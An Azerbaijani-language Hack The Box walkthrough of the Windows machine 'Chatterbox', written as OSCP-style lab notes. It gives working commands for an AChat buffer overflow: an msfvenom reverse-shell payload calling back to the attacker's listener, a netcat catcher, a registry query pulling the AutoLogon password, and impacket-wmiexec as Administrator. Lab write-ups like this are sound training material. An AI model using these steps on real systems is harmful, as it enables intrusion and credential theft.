# Chatterbox (HTB)

> Platforma: Hack The Box  
> OS: Windows  
> Çətinlik: Orta  
> Nəticə: Administrator

---

## Hücum Zənciri

```text
Kəşfiyyat
  |-- Nmap skanı SMB və AChat xidmətini aşkar edir
  \-- İlkin Giriş
       |-- AChat 0.150 beta7 SEH Buffer Overflow
       \-- alfred kimi əks qabıq (reverse shell)
Səlahiyyətlərin Artırılması
  |-- AutoLogon qeydiyyat şifrəsinin sızması
  \-- Administrator kimi WMIExec
```

> [!NOTE]
> Bütün bayraqlar, şifrələr, heşlər və sessiya tokenləri etik səbəblərə görə gizlədilmişdir.

---

## Maşın Brifinqi
Chatterbox, Windows 7 Professional işləyən Orta çətinlikli Windows maşındır. İlkin giriş əldə etmək üçün buffer overflow vasitəsilə istismar edilə bilən zəif chat serverinə (AChat) ev sahibliyi edir. Səlahiyyətlərin artırılması Windows qeydiyyatında açıq mətnli şifrə tapmaqla əldə edilir.

## Kəşfiyyat
Tam TCP port skanı bir neçə standart Windows xidmətini və fərdi chat tətbiqini aşkar edir.

```bash
$ nmap -p- --min-rate 5000 -T4 -Pn -n 10.10.10.74
...
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9255/tcp open  http
9256/tcp open  achat
```

Xidmətin aşkarlanması OS və chat proqram təminatının xüsusi versiyasını təsdiqləyir.

```bash
$ nmap -sC -sV -p 135,139,445,9255,9256 10.10.10.74
...
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds
9255/tcp open  http         AChat chat system httpd
9256/tcp open  achat        AChat chat system
```

## İlkin Giriş
No CVE (custom vulnerability) - AChat 0.150 beta7 xidməti UDP mesaj emalçısında stack-əsaslı SEH buffer overflow-a həssasdır; heç bir ictimai CVE təyin edilməyib.

İctimai eksploitlərin axtarışı bu xüsusi versiyanı hədəf alan Python skriptini aşkar edir.

```bash
$ searchsploit AChat
...
Achat 0.150 beta7 - Remote Buffer Overflow | windows/remote/36025.py
```

Eksploiti kopyalayırıq və əks qabıq (reverse shell) pеyload-u yaradırıq. Pеyload `unicode_mixed` ilə kodlanır və xidmətin vaxtından əvvəl çökməsinin qarşısını almaq üçün pis simvollardan (`\x00\x0a\x0d\x20`) yayınır.

```bash
$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -e x86/unicode_mixed -b '\x00\x0a\x0d\x20' BufferRegister=EAX -f python
...
Payload size: 642 bytes
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Skripti IP-miz və pеyload ilə yenilədikdən sonra dinləyicini işə salırıq və eksploiti icra edirik.

```bash
$ nc -nlvp 443
listening on [any] 443 ...
```

```bash
$ python3 exploit.py
---->{P00F}!
```

Hədəf geri qayıdır və bizə `alfred` kimi qabıq (shell) verir.

```text
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.74] 49158
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```

İndi istifadəçi bayrağını oxuya bilərik.

```cmd
C:\Windows\system32> type C:\Users\Alfred\Desktop\user.txt
<USER_FLAG>
```

## Səlahiyyətlərin Artırılması
AutoLogon giriş məlumatları üçün Windows qeydiyyatını yoxlamaq Administrator hesabı üçün açıq mətnli şifrəni aşkar edir.

```cmd
C:\Windows\system32> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
...
    DefaultPassword    REG_SZ    <PASSWORD>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Aşkar edilmiş şifrədən istifadə edərək WMI vasitəsilə Administrator kimi autentifikasiya oluruq. `psexec` SYSTEM qabığı (shell) versə də, `root.txt` faylı ACL-lər (Access is denied) ilə qorunur. `wmiexec` istifadə etmək qabığı Administrator istifadəçisi kontekstində işə salır və ACL məhdudiyyətini keçir.

```bash
$ impacket-wmiexec Administrator:'<PASSWORD>'@10.10.10.74
...
C:\> whoami
chatterbox\administrator
```

Nəhayət, root bayrağını oxuyuruq.

```cmd
C:\> type C:\Users\Administrator\Desktop\root.txt
<ROOT_FLAG>
```

## Bayraqlar

| Bayraq | Dəyər |
|-------|-------|
| İstifadəçi | `<USER_FLAG>` |
| Root | `<ROOT_FLAG>` |

## Əsas Nəticələr
- AChat kimi fərdi chat tətbiqləri tez-tez əsas buffer overflow-lara həssasdır; həmişə `searchsploit` yoxlayın və pis simvollardan qaçmaq üçün pеyloadları uyğunlaşdırın.
- Hər hansı giriş səviyyəsində olduqda AutoLogon giriş məlumatları (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`) üçün qeydiyyatı həmişə yoxlayın.
- `psexec` SYSTEM kimi işləyir, bu da admin hüquqlarınız olsa belə fayl ACL-ləri tərəfindən bloklana bilər. `wmiexec` istifadəçi kimi işləyir və bu xüsusi məhdudiyyətləri keçir.
